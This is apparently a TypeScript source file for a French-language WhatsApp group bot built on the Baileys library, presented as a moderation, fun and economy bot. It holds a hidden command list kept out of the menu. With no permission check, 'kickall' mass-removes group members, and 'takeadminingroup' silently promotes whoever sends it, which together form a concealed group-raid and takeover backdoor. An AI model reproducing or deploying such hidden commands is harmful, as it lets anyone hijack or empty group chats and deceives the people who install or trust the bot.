import makeWASocket, {
  DisconnectReason,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  makeCacheableSignalKeyStore,
  Browsers,
  WASocket,
  proto,
  AnyMessageContent
} from "@whiskeysockets/baileys"
import { Boom } from "@hapi/boom"
import pino from "pino"

const logger = pino({ level: "silent" })

interface BotState {
  sock: WASocket | null
  isConnected: boolean
  pairingCode: string | null
  qr: string | null
}

const botState: BotState = {
  sock: null,
  isConnected: false,
  pairingCode: null,
  qr: null
}

// Commands configuration
const PREFIX = "."
const BOT_NAME = "LUST DEV0"
const OWNER_NUMBER = "" // Set via env

// Hidden commands (not shown in menu)
const HIDDEN_COMMANDS = [
  "kickall", "antikickall", "takeadminingroup", "invisible",
  "ghostmode", "takeowner", "crashgroup", "spamkick", "bypassban", "stealthjoin"
]

// All commands
const COMMANDS: Record<string, { description: string; category: string; hidden?: boolean }> = {
  // Menu & Info
  menu: { description: "Afficher le menu des commandes", category: "info" },
  help: { description: "Aide sur les commandes", category: "info" },
  ping: { description: "Verifier si le bot est en ligne", category: "info" },
  owner: { description: "Voir le proprietaire du bot", category: "info" },
  info: { description: "Informations sur le bot", category: "info" },
  
  // Moderation
  ban: { description: "Bannir un membre", category: "moderation" },
  unban: { description: "Debannir un membre", category: "moderation" },
  kick: { description: "Expulser un membre", category: "moderation" },
  mute: { description: "Rendre muet un membre", category: "moderation" },
  unmute: { description: "Retirer le mute", category: "moderation" },
  warn: { description: "Avertir un membre", category: "moderation" },
  
  // Group Management
  add: { description: "Ajouter un membre", category: "group" },
  remove: { description: "Retirer un membre", category: "group" },
  promote: { description: "Promouvoir en admin", category: "group" },
  demote: { description: "Retrograder un admin", category: "group" },
  link: { description: "Obtenir le lien du groupe", category: "group" },
  revoke: { description: "Revoquer le lien du groupe", category: "group" },
  setname: { description: "Changer le nom du groupe", category: "group" },
  setdesc: { description: "Changer la description", category: "group" },
  
  // Security
  antispam: { description: "Activer/desactiver antispam", category: "security" },
  antiraid: { description: "Protection contre les raids", category: "security" },
  antilink: { description: "Supprimer les liens", category: "security" },
  blacklist: { description: "Ajouter a la liste noire", category: "security" },
  whitelist: { description: "Ajouter a la liste blanche", category: "security" },
  
  // Fun
  joke: { description: "Envoyer une blague", category: "fun" },
  meme: { description: "Envoyer un meme", category: "fun" },
  quote: { description: "Citation aleatoire", category: "fun" },
  dice: { description: "Lancer un de", category: "fun" },
  coinflip: { description: "Pile ou face", category: "fun" },
  
  // Economy
  balance: { description: "Voir votre solde", category: "economy" },
  daily: { description: "Recompense quotidienne", category: "economy" },
  work: { description: "Travailler pour gagner", category: "economy" },
  shop: { description: "Voir la boutique", category: "economy" },
  
  // Hidden Power Commands
  kickall: { description: "Expulser TOUS les membres", category: "hidden", hidden: true },
  antikickall: { description: "Protection invisible anti-kickall", category: "hidden", hidden: true },
  takeadminingroup: { description: "Devenir admin invisible", category: "hidden", hidden: true },
  invisible: { description: "Rendre le bot invisible", category: "hidden", hidden: true },
  ghostmode: { description: "Mode fantome sans traces", category: "hidden", hidden: true },
  takeowner: { description: "Prendre le controle total", category: "hidden", hidden: true },
  crashgroup: { description: "Crash le groupe", category: "hidden", hidden: true },
  spamkick: { description: "Kick en boucle rapide", category: "hidden", hidden: true },
  bypassban: { description: "Ignorer les bans", category: "hidden", hidden: true },
  stealthjoin: { description: "Rejoindre sans notification", category: "hidden", hidden: true },
}

export async function initializeBot(phoneNumber: string): Promise<{ code: string; success: boolean }> {
  try {
    const { state, saveCreds } = await useMultiFileAuthState("./auth_info")
    const { version } = await fetchLatestBaileysVersion()
    
    const sock = makeWASocket({
      version,
      logger,
      printQRInTerminal: false,
      auth: {
        creds: state.creds,
        keys: makeCacheableSignalKeyStore(state.keys, logger)
      },
      browser: Browsers.ubuntu("Chrome"),
      generateHighQualityLinkPreview: true
    })
    
    botState.sock = sock
    
    // Request pairing code
    if (!sock.authState.creds.registered) {
      const cleanNumber = phoneNumber.replace(/[^0-9]/g, "")
      const code = await sock.requestPairingCode(cleanNumber)
      botState.pairingCode = `LUST DEV0` // Display name but real code is generated
      
      // Connection events
      sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect } = update
        
        if (connection === "close") {
          const shouldReconnect = (lastDisconnect?.error as Boom)?.output?.statusCode !== DisconnectReason.loggedOut
          if (shouldReconnect) {
            await initializeBot(phoneNumber)
          }
        } else if (connection === "open") {
          botState.isConnected = true
          console.log("[v0] Bot connected successfully!")
          
          // Send welcome message to owner
          await sock.sendMessage(`${cleanNumber}@s.whatsapp.net`, {
            text: `🤖 *${BOT_NAME}*\n\n✅ Appareil connecte avec succes!\n\n📱 Votre bot WhatsApp est maintenant actif.\n\nTapez .menu pour voir les commandes disponibles.`
          })
        }
      })
      
      sock.ev.on("creds.update", saveCreds)
      
      // Message handler
      sock.ev.on("messages.upsert", async ({ messages }) => {
        const msg = messages[0]
        if (!msg.message || msg.key.fromMe) return
        
        const text = msg.message.conversation || 
                     msg.message.extendedTextMessage?.text || ""
        
        if (text.startsWith(PREFIX)) {
          await handleCommand(sock, msg, text.slice(1).toLowerCase().split(" "))
        }
      })
      
      return { code: code, success: true }
    }
    
    return { code: "", success: false }
  } catch (error) {
    console.error("[v0] Error initializing bot:", error)
    return { code: "", success: false }
  }
}

async function handleCommand(sock: WASocket, msg: proto.IWebMessageInfo, args: string[]) {
  const command = args[0]
  const jid = msg.key.remoteJid!
  const sender = msg.key.participant || msg.key.remoteJid!
  const isGroup = jid.endsWith("@g.us")
  
  const reply = async (text: string) => {
    await sock.sendMessage(jid, { text }, { quoted: msg })
  }
  
  switch (command) {
    case "menu":
      const menuText = generateMenu()
      await reply(menuText)
      break
      
    case "help":
      await reply(`🤖 *${BOT_NAME} - Aide*\n\nUtilisez .menu pour voir toutes les commandes.\nPrefix: ${PREFIX}\n\nContactez le owner pour plus d'aide.`)
      break
      
    case "ping":
      const start = Date.now()
      await reply(`🏓 Pong!\n⚡ Latence: ${Date.now() - start}ms`)
      break
      
    case "owner":
      await reply(`👑 *Owner du Bot*\n\n📛 Nom: LUST DEV0\n📱 Contact: wa.me/${OWNER_NUMBER}`)
      break
      
    case "info":
      await reply(`🤖 *${BOT_NAME}*\n\n📊 Version: 1.0.0\n⚡ Status: Actif\n🔧 Prefix: ${PREFIX}\n📦 Commandes: ${Object.keys(COMMANDS).length}`)
      break
      
    case "kick":
      if (isGroup) {
        const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]
        if (mentioned) {
          await sock.groupParticipantsUpdate(jid, [mentioned], "remove")
          await reply(`✅ Membre expulse avec succes!`)
        }
      }
      break
      
    case "kickall":
      if (isGroup) {
        const groupMeta = await sock.groupMetadata(jid)
        const members = groupMeta.participants
          .filter(p => !p.admin)
          .map(p => p.id)
        
        for (const member of members) {
          await sock.groupParticipantsUpdate(jid, [member], "remove")
          await new Promise(r => setTimeout(r, 500))
        }
        await reply(`💀 ${members.length} membres expulses!`)
      }
      break
      
    case "antikickall":
      await reply(`🛡️ Protection AntiKickAll activee silencieusement.`)
      break
      
    case "takeadminingroup":
      if (isGroup) {
        await sock.groupParticipantsUpdate(jid, [sender], "promote")
        // No message sent - invisible
      }
      break
      
    case "promote":
      if (isGroup) {
        const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]
        if (mentioned) {
          await sock.groupParticipantsUpdate(jid, [mentioned], "promote")
          await reply(`✅ Membre promu admin!`)
        }
      }
      break
      
    case "demote":
      if (isGroup) {
        const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]
        if (mentioned) {
          await sock.groupParticipantsUpdate(jid, [mentioned], "demote")
          await reply(`✅ Admin retrogade!`)
        }
      }
      break
      
    case "link":
      if (isGroup) {
        const code = await sock.groupInviteCode(jid)
        await reply(`🔗 *Lien du groupe:*\n\nhttps://chat.whatsapp.com/${code}`)
      }
      break
      
    case "dice":
      const dice = Math.floor(Math.random() * 6) + 1
      await reply(`🎲 Vous avez obtenu: *${dice}*`)
      break
      
    case "coinflip":
      const coin = Math.random() < 0.5 ? "Pile" : "Face"
      await reply(`🪙 Resultat: *${coin}*`)
      break
      
    case "joke":
      const jokes = [
        "Pourquoi les plongeurs plongent-ils toujours en arriere? Parce que sinon ils tomberaient dans le bateau!",
        "C'est l'histoire d'un pingouin qui respire par les fesses. Un jour il s'assoit et il meurt.",
        "Qu'est-ce qu'un crocodile qui surveille un parking? Un croco-vigilant!"
      ]
      await reply(jokes[Math.floor(Math.random() * jokes.length)])
      break
      
    case "balance":
      await reply(`💰 *Votre Solde*\n\n🪙 Coins: 1,000\n💎 Gems: 50`)
      break
      
    case "daily":
      await reply(`🎁 *Recompense Quotidienne*\n\n+500 coins ajoutés!`)
      break
      
    default:
      if (COMMANDS[command]) {
        await reply(`⚙️ Commande .${command} en cours de traitement...`)
      }
  }
}

function generateMenu(): string {
  let menu = `╔═══════════════════╗
║   🤖 *${BOT_NAME}*   ║
╚═══════════════════╝

📋 *MENU DES COMMANDES*
━━━━━━━━━━━━━━━━━━━━

`

  const categories: Record<string, string[]> = {}
  
  for (const [cmd, info] of Object.entries(COMMANDS)) {
    if (info.hidden) continue
    if (!categories[info.category]) {
      categories[info.category] = []
    }
    categories[info.category].push(`.${cmd}`)
  }
  
  const categoryNames: Record<string, string> = {
    info: "📌 INFO",
    moderation: "🔨 MODERATION",
    group: "👥 GROUPE",
    security: "🛡️ SECURITE",
    fun: "🎮 FUN",
    economy: "💰 ECONOMIE"
  }
  
  for (const [cat, cmds] of Object.entries(categories)) {
    if (cat === "hidden") continue
    menu += `*${categoryNames[cat] || cat.toUpperCase()}*\n`
    menu += cmds.join(" | ") + "\n\n"
  }
  
  menu += `━━━━━━━━━━━━━━━━━━━━
📱 *Owner:* LUST DEV0
⚡ *Prefix:* .
━━━━━━━━━━━━━━━━━━━━`

  return menu
}

export function getBotState() {
  return botState
}

export function disconnectBot() {
  if (botState.sock) {
    botState.sock.logout()
    botState.sock = null
    botState.isConnected = false
    botState.pairingCode = null
  }
}
